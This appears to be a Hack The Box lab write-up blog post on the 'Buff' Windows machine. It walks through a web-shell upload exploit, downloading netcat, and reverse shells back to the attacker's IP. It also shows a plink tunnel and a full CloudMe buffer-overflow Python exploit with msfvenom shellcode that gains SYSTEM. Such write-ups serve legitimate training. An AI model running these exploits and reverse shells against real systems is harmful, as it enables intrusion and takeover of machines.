<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    
    <meta name="description" content="Write-ups about Linux and Security">
    <meta name="keywords" content="blog,security,linux">

    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Buff"/>
<meta name="twitter:description" content="Machine info  OS : Windows Difficulty : Easy Points : 20 IP : 10.10.10.198  Mind Map Reconnaisance Initial scan:
sudo nmap -sT -n -O 10.10.10.5 -oA nmap/sT_scan Result:
sudo nmap -sC -sV -n -Pn 10.10.10.198 Nmap scan report for 10.10.10.198 Host is up (0.082s latency). Not shown: 999 filtered ports PORT STATE SERVICE VERSION 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Apache/2."/>

    <meta property="og:title" content="Buff" />
<meta property="og:description" content="Machine info  OS : Windows Difficulty : Easy Points : 20 IP : 10.10.10.198  Mind Map Reconnaisance Initial scan:
sudo nmap -sT -n -O 10.10.10.5 -oA nmap/sT_scan Result:
sudo nmap -sC -sV -n -Pn 10.10.10.198 Nmap scan report for 10.10.10.198 Host is up (0.082s latency). Not shown: 999 filtered ports PORT STATE SERVICE VERSION 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Apache/2." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/hackthebox/buff/" />
<meta property="article:published_time" content="2020-07-24T16:04:02+01:00" />
<meta property="article:modified_time" content="2020-07-24T16:04:02+01:00" />


    
      <base href="/posts/hackthebox/buff/">
    
    <title>
  Buff · lafx0
</title>

    
      <link rel="canonical" href="/posts/hackthebox/buff/">
    

    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.11.2/css/all.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />

    
      
      
      <link rel="stylesheet" href="/css/coder.min.a4f332213a21ce8eb521670c614470c58923aaaf385e2a73982c31dd7642decb.css" integrity="sha256-pPMyITohzo61IWcMYURwxYkjqq84XipzmCwx3XZC3ss=" crossorigin="anonymous" media="screen" />
    

    

    

    
      <link rel="stylesheet" href="/css/custom.css" />
    

    

    

    <link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">

    <meta name="generator" content="Hugo 0.66.0" />
  </head>

  
  
  <body class="colorscheme-light">
    <main class="wrapper">
      <nav class="navigation">
  <section class="container">
    <a class="navigation-title" href="/">
      lafx0
    </a>
    
    <input type="checkbox" id="menu-toggle" />
    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
    <ul class="navigation-list">
      
        
          <li class="navigation-item">
            <a class="navigation-link" href="/posts/">Blog</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="/about/info/">About</a>
          </li>
        
      
      
    </ul>
    
  </section>
</nav>


      <div class="content">
        
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">Buff</h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fas fa-calendar"></i>
              <time datetime='2020-07-24T16:04:02&#43;01:00'>
                July 24, 2020
              </time>
            </span>
            <span class="reading-time">
              <i class="fas fa-clock"></i>
              5-minute read
            </span>
          </div>
          
          
        </div>
      </header>

      <div>
        
        <h1 id="machine-info">Machine info</h1>
<ul>
<li>OS : Windows</li>
<li>Difficulty : Easy</li>
<li>Points : 20</li>
<li>IP : 10.10.10.198</li>
</ul>
<h1 id="mind-map">Mind Map</h1>
<p><img src="/images/htb/buff_mindmap.png" alt="Buff_MindMap"></p>
<h1 id="reconnaisance">Reconnaisance</h1>
<p>Initial scan:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">sudo nmap -sT -n -O 10.10.10.5 -oA nmap/sT_scan</code></pre></div>
<p>Result:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">sudo nmap -sC -sV -n -Pn 10.10.10.198

Nmap scan report for 10.10.10.198
Host is up (0.082s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n&#39;s Bro Hut</code></pre></div>
<h1 id="enumeration">Enumeration</h1>
<p>Only port <code>8080</code> appears to be open. Service is <code>http</code>, so let&rsquo;s visit the address in a web browser:</p>
<p><img src="/images/htb/buff_page8080.png" alt="Buff_Page8080_MindMap"></p>
<p>We are presented with a web page about fitness packages. Looking around on the website and visiting the contact page, we can see that it was built using <strong>Gym Management Software 1.0</strong>.</p>
<p><img src="/images/htb/gym_management.png" alt="Gym_Management_MindMap"></p>
<p>Googling for that version, we discover that there is a Remote Code Execution (RCE) vulnerability affecting this exact service:</p>
<blockquote>
<p>Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution (RCE) on the Hosting Webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters.</p>
</blockquote>
<p>The exploit can be found here: <a href="https://www.exploit-db.com/exploits/48506">https://www.exploit-db.com/exploits/48506</a></p>
<p>Once the exploit is run, we will be able to communicate with the uploaded web shell at <code>/upload.php?id=kamehameha</code> using <code>GET</code> requests with the <code>telepathy</code> parameter.</p>
<h1 id="exploitation">Exploitation</h1>
<p>I download the exploit and execute it against the target machine:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">python 48506.py http://10.10.10.198:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU=====================&#34;
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload&gt; whoami
�PNG
▒
buff\shaun

C:\xampp\htdocs\gym\upload&gt;</code></pre></div>
<p>I  am logged in as the <strong>shaun</strong> user!</p>
<p>The obtained shell appears not to be very stable, we can upgrade it to a netcat shell. It is possible to download netcat on the target machine as follows:</p>
<ul>
<li>set up a python HTTP server on the attacking machine in order to serve the <code>nc.exe</code> file</li>
<li>visit the following page in the web browser in order to request the file from the attacking machine:
<strong>http://10.10.10.198:8080/upload/kamehameha.php?telepathy=curl -O 10.10.14.18:8888/nc.exe</strong></li>
</ul>
<p>Where:</p>
<ul>
<li><code>10.10.14.18</code> is the IP assigned to my machine</li>
</ul>
<p><strong>-&gt;</strong> After that, <code>nc.exe</code> will be present on the target machine.</p>
<p>To connect back to the attacking machine I set up a netcat listener on port <code>4444</code> and launch the following command from the browser:</p>
<p><strong>http://10.10.10.198:8080/upload/kamehameha.php?telepathy=nc.exe 10.10.14.18 4444 -e cmd.exe</strong></p>
<p>Now I have a stable netcat shell:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.198] 49682
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\gym\upload&gt;whoami
whoami
buff\shaun

C:\xampp\htdocs\gym\upload&gt;</code></pre></div>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Under <code>C:\Users\shaun\Downloads\</code> there is a program named <strong>CloudMe_1112.exe</strong> running as <code>Local System</code>. Searching for that program I discover that is vulnerable to buffer overflow.
The exploit is availble here: <a href="https://www.exploit-db.com/exploits/48389">https://www.exploit-db.com/exploits/48389</a></p>
<p>It runs on port <code>8888</code>, which is unaccessible from my attacking machine, so how can I exploit that service? Setting up a <strong>SSH Reverse Tunnel</strong>!</p>
<p><strong>Reverse SSH tunneling allows you to use an established connection to set up a new connection from your local computer back to the remote computer.</strong></p>
<p>This means that I will be able to run the buffer overflow exploit on the attacking machine (mine) and have it executed  against the target machine!</p>
<p>First of all we need to download <code>plink.exe</code> on the target machine in the same way we downloaded netcat:
<strong>http://10.10.10.198:8080/upload/kamehameha.php?telepathy=curl -O 10.10.14.18:8888/plink.exe</strong></p>
<p>Then set up the SSH Remote Tunnel from the web server:</p>
<p><strong>1.</strong> From the attacking machine enable the ssh service:
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">service ssh start</code></pre></div></p>
<p><strong>2.</strong> On the web server set up the SSH Reverse Tunnel:
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">plink.exe -l root -p toor -R 4444:127.0.0.1:8888 10.10.14.18</code></pre></div>
Where:</p>
<ul>
<li><code>-l</code> specifies the user on the attacking machine</li>
<li><code>-p</code> specifies the user password</li>
<li><code>-R</code> stands for remote. Everything running on the remote host <code>10.10.14.18</code> on port <code>4444</code> will be executed on the web server (<code>localhost</code>) at <code>8888</code>!</li>
</ul>
<p>At this  point, on the local attacking machine I have to run the final exploit against the <code>CloudmMe</code> service. I only need to create a custom payload and add it to the exploit.</p>
<p>I want to  have a reverse connection coming back to my machine after the exploit is executed:</p>
<p><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">msfvenom -p windows/exec CMD=&#39;C:\xampp\htdocs\gym\upload\nc.exe 10.10.14.18 5555 -e cmd.exe&#39; -b &#39;\x00\x0A\x0D&#39; -f python</code></pre></div>
Where:</p>
<ul>
<li><code>CMD</code> is the command I want to execute after the exploit, which is a netcat reverse shell on port <code>5555</code> of my machine</li>
</ul>
<p>I paste the command result in the exploit. At this point I only have to set up a netcat listener on port <code>5555</code> and launch the exploit, which will look like:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">import socket
import sys

target = &#34;127.0.0.1&#34;

padding1   = b&#34;\x90&#34; * 1052
EIP        = b&#34;\xB5\x42\xA8\x68&#34; # 0x68A842B5 -&gt; PUSH ESP, RET
NOPS       = b&#34;\x90&#34; * 30                                                                                                                                                     

#msfvenom -p windows/exec CMD=&#39;C:\xampp\htdocs\gym\upload\nc.exe 10.10.14.18 5555 -e cmd.exe&#39; -b &#39;\x00\x0A\x0D&#39; -f python python                                                                                                     
payload =  b&#34;&#34;                                                                                                                                                                
payload += b&#34;\xdb\xca\xd9\x74\x24\xf4\xb8\x84\x4f\x0f\xa5\x5b&#34;                                                                                                                
payload += b&#34;\x29\xc9\xb1\x3e\x83\xc3\x04\x31\x43\x15\x03\x43&#34;
payload += b&#34;\x15\x66\xba\xf3\x4d\xe4\x45\x0c\x8e\x88\xcc\xe9&#34;
payload += b&#34;\xbf\x88\xab\x7a\xef\x38\xbf\x2f\x1c\xb3\xed\xdb&#34;
payload += b&#34;\x97\xb1\x39\xeb\x10\x7f\x1c\xc2\xa1\xd3\x5c\x45&#34;
payload += b&#34;\x22\x29\xb1\xa5\x1b\xe2\xc4\xa4\x5c\x1e\x24\xf4&#34;
payload += b&#34;\x35\x55\x9b\xe9\x32\x23\x20\x81\x09\xa2\x20\x76&#34;
payload += b&#34;\xd9\xc5\x01\x29\x51\x9c\x81\xcb\xb6\x95\x8b\xd3&#34;
payload += b&#34;\xdb\x93\x42\x6f\x2f\x68\x55\xb9\x61\x91\xfa\x84&#34;
payload += b&#34;\x4d\x60\x02\xc0\x6a\x9a\x71\x38\x89\x27\x82\xff&#34;
payload += b&#34;\xf3\xf3\x07\xe4\x54\x70\xbf\xc0\x65\x55\x26\x82&#34;
payload += b&#34;\x6a\x12\x2c\xcc\x6e\xa5\xe1\x66\x8a\x2e\x04\xa9&#34;
payload += b&#34;\x1a\x74\x23\x6d\x46\x2f\x4a\x34\x22\x9e\x73\x26&#34;
payload += b&#34;\x8d\x7f\xd6\x2c\x20\x94\x6b\x6f\x2f\x6b\xf9\x15&#34;
payload += b&#34;\x1d\x6b\x01\x16\x32\x03\x30\x9d\xdd\x54\xcd\x74&#34;
payload += b&#34;\x9a\xaa\x87\xd5\x8b\x22\x4e\x8c\x89\x2f\x71\x7a&#34;
payload += b&#34;\xcd\x49\xf2\x8f\xae\xae\xea\xe5\xab\xeb\xac\x16&#34;
payload += b&#34;\xc6\x64\x59\x19\x75\x85\x48\x5a\x43\x25\x0b\x3c&#34;
payload += b&#34;\xde\xa5\x9b\xe2\x48\x31\x38\x74\xea\xca\x9c\xed&#34;
payload += b&#34;\x95\x41\x41\x87\x15\xf5\x16\x06\xb2\x59\x87\xab&#34;
payload += b&#34;\x14\x04\x2f\x49\x49\xeb\xaa\xb1\xea\x9e\x50\x9c&#34;
payload += b&#34;\x89\x18\xfc\xc0\x60\xe8\xd0\x31\xb3\x26\x1c\x06&#34;
payload += b&#34;\x9d\x07\x66\x46\xd4\x52\xa3\xb3\x16&#34;

overrun    = b&#34;C&#34; * (1500 - len(padding1 + NOPS + EIP + payload))

buf = padding1 + EIP + NOPS + payload + overrun

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,4444))
        s.send(buf)
except Exception as e:
        print(sys.exc_value)</code></pre></div>
<p><strong>Note</strong>: The exploit will be run against port <code>4444</code> on the local machine (attacking machine) but it will be forwarded to the web server on port <code>8888</code> leveraging the ssh tunnel.</p>
<p>Launching the exploit locally will result in a <strong>SYSTEM</strong> shell!
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">nc -nlvp 5555
listening on [any] 5555 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.198] 49688
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
whoami
buff\administrator

C:\Windows\system32&gt;</code></pre></div></p>
<h2 id="lessons-learned-and-remediations">Lessons learned and remediations</h2>
<ul>
<li>The website is built on on a technology that presents security vulnerabilities. It was easy to find an exploit and gain a low privileged session on the web server. The administrator should patch the software if an update is available or he should consider to switch to another service that is more secure.</li>
<li>The administrator should consider removing the CloudMe application (vulnerable to BoF and running as Local System) from a system space dedicated to low privileged users. The program can be easily exploited to gain System privileges on the machine.</li>
</ul>

      </div>


      <footer>
        


        
        
        
      </footer>
    </article>

    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
  <script type="text/javascript" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js" id="MathJax-script"></script>
  <script>
    MathJax = {
      tex: {
        inlineMath: [
          ['$', '$'], ['\\(', '\\)']
        ],
        processEscapes: true,
        processEnvironments: true
      },
      options: {
        skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
      }
    };
  </script>
  </section>

      </div>

      <footer class="footer">
  <section class="container">
    
      <p>'  '</p>
    
    
    
    
  </section>
</footer>

    </main>

    

    

  </body>

</html>
